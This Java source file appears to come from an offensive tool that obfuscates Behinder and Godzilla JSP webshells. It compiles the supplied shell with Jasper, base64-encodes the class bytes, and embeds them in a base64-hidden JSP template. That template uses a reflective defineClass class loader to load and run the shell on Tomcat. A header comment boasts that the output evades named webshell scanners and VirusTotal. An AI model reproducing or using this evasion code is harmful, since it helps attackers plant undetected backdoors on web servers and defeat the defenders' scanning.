package encode;

import application.RandomString;
import org.apache.jasper.JspC;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class JspEncodeDemo2 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;
    String demotxt;

    public JspEncodeDemo2() {
    }

    public JspEncodeDemo2(String tamplate, String key, String code) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = code;
    }

    public static String GetDemotxt(){

        return "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-11-04_jspdemo2\n" +
                " * Bypass: 河马在线、河马本地(1.8.2)、D盾(2.1.7)、WEBDIR+、微步(安全)、VT(0红)、\n" +
                " * 适配: tomcat8.x、tomcat9.0.x、tomcat10.x\n" +
                " * java8 <= java版本 <= java21\n" +
                " */";
    }

    public String[] Run() throws Exception {

        if(!sourcecode.isEmpty()){
            try {

                if(this.key.equals("默认随机")){
                    this.key = "g"+RandomString.getRString(8);
                }

                String filename = this.key+".jsp";
                File file = new File("./cache/");
                file.mkdir();
                FileOutputStream fileOutputStream = new FileOutputStream("./cache/"+filename);
                this.sourcecode = this.sourcecode.replace("new sun.misc.BASE64Decoder().decodeBuffer","java.util.Base64.getDecoder().decode");
                fileOutputStream.write(this.sourcecode.getBytes(StandardCharsets.UTF_8));

                JspC jspc = new JspC();
                jspc.setUriroot("./cache/");
                jspc.setOutputDir("./cache/");
                jspc.setJspFiles(filename);
                jspc.setCompile(true);
                jspc.execute();

                File file2 = new File("./cache/org/apache/jsp/");
                File[] list = file2.listFiles();
                String jspsource = "";
                for (File f : list) {
                    if (f.getName().contains(".class")) {
                        FileInputStream fileInputStream = new FileInputStream(f.getPath());
                        byte[] buffer = new byte[(int) f.length()];
                        fileInputStream.read(buffer);
                        String s = Base64.getEncoder().encodeToString(buffer);
                        String[] split = f.getName().split("\\.");
                        String demo1 = "U3RyaW5nICRjbGFzc25hbWUkID0gIiRjbGFzc2Jhc2U2NCQiO21hcC5wdXQoIiRjbGFzc25hbWUkIiwgJGNsYXNzbmFtZSQpOw==";
                        String base64class = new String(Base64.getDecoder().decode(demo1));
                        base64class = base64class.replace("$classname$",split[0]);
                        base64class = base64class.replace("$classbase64$",s);
                        jspsource +=base64class;
                    }
                }
                String demo = "PCVAIHBhZ2UgbGFuZ3VhZ2U9ImphdmEiIHBhZ2VFbmNvZGluZz0iVVRGLTgiICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS51dGlsLioiICU+CjwlQCBwYWdlIGltcG9ydD0ib3JnLmFwYWNoZS5qYXNwZXIuc2VydmxldC5Kc3BTZXJ2bGV0IiAlPgo8JUAgcGFnZSBpbXBvcnQ9Im9yZy5hcGFjaGUuamFzcGVyLnJ1bnRpbWUuSHR0cEpzcEJhc2UiICU+CjwlQCBwYWdlIGltcG9ydD0ib3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLlN0YW5kYXJkV3JhcHBlckZhY2FkZSIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuU3RhbmRhcmRXcmFwcGVyIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEubGFuZy5yZWZsZWN0LkZpZWxkIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmxhbmcucmVmbGVjdC5BY2Nlc3NpYmxlT2JqZWN0IiAlPgoKPCUhCiAgICBwdWJsaWMgY2xhc3MgSnNwQ2xhc3NMb2FkZXIgZXh0ZW5kcyBDbGFzc0xvYWRlciB7CgogICAgICAgIHB1YmxpYyBKc3BDbGFzc0xvYWRlcihDbGFzc0xvYWRlciBwYXJlbnQpIHsKICAgICAgICAgICAgc3VwZXIocGFyZW50KTsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBDbGFzczw/PiBmaW5kQ2xhc3MoU3RyaW5nIG5hbWUpIHsKCiAgICAgICAgICAgIE1hcDxTdHJpbmcsIFN0cmluZz4gbWFwID0gbmV3IEhhc2hNYXA8PigpOwoKICAgICAgICAgICAgJGJhc2U2NGNvZGUkCgogICAgICAgICAgICBTdHJpbmdbXSBzcGxpdCA9IG5hbWUuc3BsaXQoIlxcLiIpOwogICAgICAgICAgICBieXRlW10gY2xhc3NCeXRlcyA9IG51bGw7CiAgICAgICAgICAgIGNsYXNzQnl0ZXMgPSBCYXNlNjQuZ2V0RGVjb2RlcigpLmRlY29kZShtYXAuZ2V0KHNwbGl0W3NwbGl0Lmxlbmd0aCAtIDFdKSk7CiAgICAgICAgICAgIE1ldGhvZCBkZW1vY2xhc3MgPSBudWxsOwogICAgICAgICAgICBDbGFzczw/PiBhQ2xhc3MgPSBudWxsOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgZGVtb2NsYXNzID0gQ2xhc3NMb2FkZXIuY2xhc3MuZ2V0RGVjbGFyZWRNZXRob2QoImRlZmluZUNsYXNzIiwgU3RyaW5nLmNsYXNzLCBieXRlW10uY2xhc3MsIGludC5jbGFzcywgaW50LmNsYXNzKTsKICAgICAgICAgICAgICAgIE1ldGhvZCBzZXRBY2Nlc3NpYmxlID0gQWNjZXNzaWJsZU9iamVjdC5jbGFzcy5nZXRNZXRob2QoInNldEFjY2Vzc2libGUiLCBib29sZWFuLmNsYXNzKTsKICAgICAgICAgICAgICAgIHNldEFjY2Vzc2libGUuaW52b2tlKGRlbW9jbGFzcyx0cnVlKTsKICAgICAgICAgICAgICAgIGFDbGFzcyA9IChDbGFzczw/PilkZW1vY2xhc3MuLyphKi8KICAgICAgICAgICAgICAgICAgICAgICAgaW52b2tlKHRoaXMsIG5hbWUsIGNsYXNzQnl0ZXMsIDAsIGNsYXNzQnl0ZXMubGVuZ3RoKTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGFDbGFzczsKICAgICAgICB9CiAgICB9CiU+Cgo8JQogICAgSnNwU2VydmxldCBqc3BTZXJ2bGV0ID0gbmV3IEpzcFNlcnZsZXQoKTsKICAgIEpzcENsYXNzTG9hZGVyIGpzcENsYXNzTG9hZGVyID0gbmV3IEpzcENsYXNzTG9hZGVyKGpzcFNlcnZsZXQuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKTsKICAgIEh0dHBKc3BCYXNlIGh0dHBKc3BCYXNlID0gKEh0dHBKc3BCYXNlKSBqc3BDbGFzc0xvYWRlci5maW5kQ2xhc3MoIm9yZy5hcGFjaGUuanNwLiRrZXkkX2pzcCIpLi8qYSovCiAgICAgICAgICAgIG5ld0luc3RhbmNlKCk7CiAgICBTdGFuZGFyZFdyYXBwZXJGYWNhZGUgc3RhbmRhcmRXcmFwcGVyRmFjYWRlID0gbmV3IFN0YW5kYXJkV3JhcHBlckZhY2FkZShuZXcgU3RhbmRhcmRXcmFwcGVyKCkpOwogICAgRmllbGQgY29uZmlnMSA9IHN0YW5kYXJkV3JhcHBlckZhY2FkZS5nZXRDbGFzcygpLmdldERlY2xhcmVkRmllbGQoImNvbmZpZyIpOwogICAgY29uZmlnMS5zZXRBY2Nlc3NpYmxlKHRydWUpOwogICAgY29uZmlnMS5zZXQoc3RhbmRhcmRXcmFwcGVyRmFjYWRlLCBwYWdlQ29udGV4dC5nZXRTZXJ2bGV0Q29uZmlnKCkpOwogICAgRmllbGQgY29udGV4dCA9IHN0YW5kYXJkV3JhcHBlckZhY2FkZS5nZXRDbGFzcygpLmdldERlY2xhcmVkRmllbGQoImNvbnRleHQiKTsKICAgIGNvbnRleHQuc2V0QWNjZXNzaWJsZSh0cnVlKTsKICAgIGNvbnRleHQuc2V0KHN0YW5kYXJkV3JhcHBlckZhY2FkZSwgcGFnZUNvbnRleHQuZ2V0U2VydmxldENvbnRleHQoKSk7CiAgICBodHRwSnNwQmFzZS5pbml0KHN0YW5kYXJkV3JhcHBlckZhY2FkZSk7CiAgICBodHRwSnNwQmFzZS5zZXJ2aWNlKHJlcXVlc3QsIHJlc3BvbnNlKTsKJT4=";
                encode = new String(Base64.getDecoder().decode(demo));

                encode = encode.replace("$key$",this.key);
                encode = encode.replace("$base64code$",jspsource);

                deleteDir("./cache/");

                return new String[]{this.encode,""};
            }catch (Exception e){
                deleteDir("./cache/");
                return new String[]{"加密失败",""};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉JSP源码",""};
        }
    }

    public static void deleteDir(String path) {
        File file = new File(path);
        File[] list = file.listFiles();
        for (File f : list) {
            if (f.isDirectory()) {
                deleteDir(f.getPath());
            } else {
                f.delete();
            }
        }
        file.delete();
    }
}
